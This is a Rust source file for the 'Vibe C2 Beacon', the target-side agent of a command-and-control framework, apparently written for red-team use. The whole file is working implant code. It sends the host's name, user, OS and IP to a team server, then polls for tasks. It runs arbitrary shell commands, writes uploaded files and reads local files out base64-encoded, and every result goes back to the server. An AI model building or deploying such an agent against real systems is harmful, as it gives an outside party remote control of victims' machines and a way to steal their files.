use anyhow::{anyhow, Result};
use base64::Engine;
use clap::Parser;
use colored::*;
use serde_json;
use vibe_c2::{
    BeaconRegistration, Command, CommandResponse, CommandResult, Task, routes,
};
use std::{
    fs,
    process::Command as ProcessCommand,
    time::Duration,
};
use tokio::time;
use tracing::{info, error, Level};
use tracing_subscriber::FmtSubscriber;

/// Command line arguments for the Vibe C2 Beacon
#[derive(Parser, Debug)]
#[command(author, version, about = "Vibe C2 Beacon - Target-side agent for the Vibe C2 Framework", long_about = None)]
struct Args {
    /// Team server address
    #[arg(short = 'r', long, default_value = "http://localhost:8080")]
    server: String,
    
    /// Time to sleep between check-ins (in seconds)
    #[arg(short, long, default_value_t = 30)]
    sleep: u64,
}

/// State for the beacon
struct BeaconState {
    id: Option<String>,
    server_url: String,
    sleep_time: Duration,
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    info!("{}", "Starting Vibe C2 Beacon...".bright_cyan().bold());
    
    let args = Args::parse();
    
    let mut state = BeaconState {
        id: None,
        server_url: args.server,
        sleep_time: Duration::from_secs(args.sleep),
    };
    
    // Register with the server
    register_beacon(&mut state).await?;
    
    // Main beacon loop
    loop {
        match check_in(&state).await {
            Ok(tasks) => {
                for task in tasks {
                    match execute_task(&state, task).await {
                        Ok(_) => info!("{} {}", "Task executed".green().bold(), "successfully".bright_yellow()),
                        Err(e) => error!("{} {}", "Failed to execute task:".red().bold(), e),
                    }
                }
            }
            Err(e) => error!("{} {}", "Failed to check in:".red().bold(), e),
        }
        
        // Sleep before next check-in
        time::sleep(state.sleep_time).await;
    }
}

/// Register the beacon with the team server
async fn register_beacon(state: &mut BeaconState) -> Result<()> {
    info!("{}", "Registering with team server...".cyan());
    
    // Gather system information
    let hostname = hostname::get()?.to_string_lossy().to_string();
    let username = whoami::username();
    let os = format!("{} {}", whoami::distro(), whoami::arch());
    let ip = local_ip_address::local_ip()?.to_string();
    
    // Create registration data
    let registration = BeaconRegistration {
        hostname,
        username,
        os,
        ip,
    };
    
    // Send registration request
    let client = reqwest::Client::new();
    let response = client
        .post(format!("{}{}", state.server_url, routes::REGISTER))
        .json(&registration)
        .send()
        .await?;
    
    if response.status().is_success() {
        let beacon_id: String = response.json().await?;
        info!("{} {}", "Registered with ID:".green().bold(), beacon_id.bright_white());
        state.id = Some(beacon_id);
        Ok(())
    } else {
        Err(anyhow!("{} {}", "Failed to register:".red().bold(), response.status()))
    }
}

/// Check in with the team server and get pending tasks
async fn check_in(state: &BeaconState) -> Result<Vec<Task>> {
    let beacon_id = state.id.as_ref().ok_or_else(|| anyhow!("Not registered"))?;
    
    // Send check-in request
    let client = reqwest::Client::new();
    let response = client
        .post(format!("{}{}", state.server_url, routes::CHECK_IN))
        .json(beacon_id)
        .send()
        .await?;
    
    if response.status().is_success() {
        let tasks: Vec<Task> = response.json().await?;
        if !tasks.is_empty() {
            info!("{} {}", "Received".cyan(), format!("{} tasks", tasks.len()).bright_yellow().bold());
        }
        Ok(tasks)
    } else {
        Err(anyhow!("{} {}", "Failed to check in:".red().bold(), response.status()))
    }
}

/// Execute a task and send the result back to the team server
async fn execute_task(state: &BeaconState, task: Task) -> Result<()> {
    info!("{} {}", "Executing task:".yellow().bold(), format!("{:?}", task.command).bright_white());
    
    let result = match &task.command {
        Command::Shell(cmd) => execute_shell(cmd),
        Command::Upload { data, destination } => upload_file(data, destination),
        Command::Download { source } => download_file(source),
        Command::Sleep { seconds } => {
            info!("{} {}", "Changing sleep time to".cyan(), format!("{} seconds", seconds).bright_yellow());
            // In a real implementation, we would update the sleep time here
            Ok(CommandResult::Success(format!("Sleep time set to {} seconds", seconds)))
        }
        Command::Terminate => {
            info!("{}", "Terminating beacon".red().bold());
            std::process::exit(0);
        }
    };
    
    // Create response
    let response = CommandResponse {
        id: task.id,
        beacon_id: task.beacon_id,
        result: match result {
            Ok(r) => r,
            Err(e) => CommandResult::Error(e.to_string()),
        },
    };
    
    // Format response for the new command_output endpoint
    let result_string = match &response.result {
        CommandResult::Success(s) => s.clone(),
        CommandResult::Error(e) => format!("ERROR: {}", e),
        CommandResult::FileData(d) => format!("FILE DATA: {} bytes", d.len()),
    };
    
    let command_output = serde_json::json!({
        "beacon_id": response.beacon_id,
        "task_id": response.id,
        "output": result_string
    });
    
    // Send response back to server using the new command_output endpoint
    let client = reqwest::Client::new();
    client
        .post(format!("{}{}", state.server_url, routes::COMMAND_OUTPUT))
        .json(&command_output)
        .send()
        .await?;
    
    info!("{} {}", "Response sent to server via new endpoint:".green(), 
          format!("/command_output").bright_green());
    
    Ok(())
}

/// Execute a shell command
fn execute_shell(cmd: &str) -> Result<CommandResult> {
    #[cfg(target_family = "unix")]
    let output = ProcessCommand::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()?;
    
    #[cfg(target_family = "windows")]
    let output = ProcessCommand::new("cmd")
        .arg("/C")
        .arg(cmd)
        .output()?;
    
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    
    let result = if output.status.success() {
        stdout
    } else {
        format!("Error: {}\n{}", output.status, stderr)
    };
    
    Ok(CommandResult::Success(result))
}

/// Upload a file to the beacon
fn upload_file(data: &str, destination: &str) -> Result<CommandResult> {
    let decoded = base64::engine::general_purpose::STANDARD.decode(data)?;
    fs::write(destination, decoded)?;
    
    Ok(CommandResult::Success(format!("File written to {}", destination)))
}

/// Download a file from the beacon
fn download_file(source: &str) -> Result<CommandResult> {
    let data = fs::read(source)?;
    let encoded = base64::engine::general_purpose::STANDARD.encode(data);
    
    Ok(CommandResult::FileData(encoded))
}
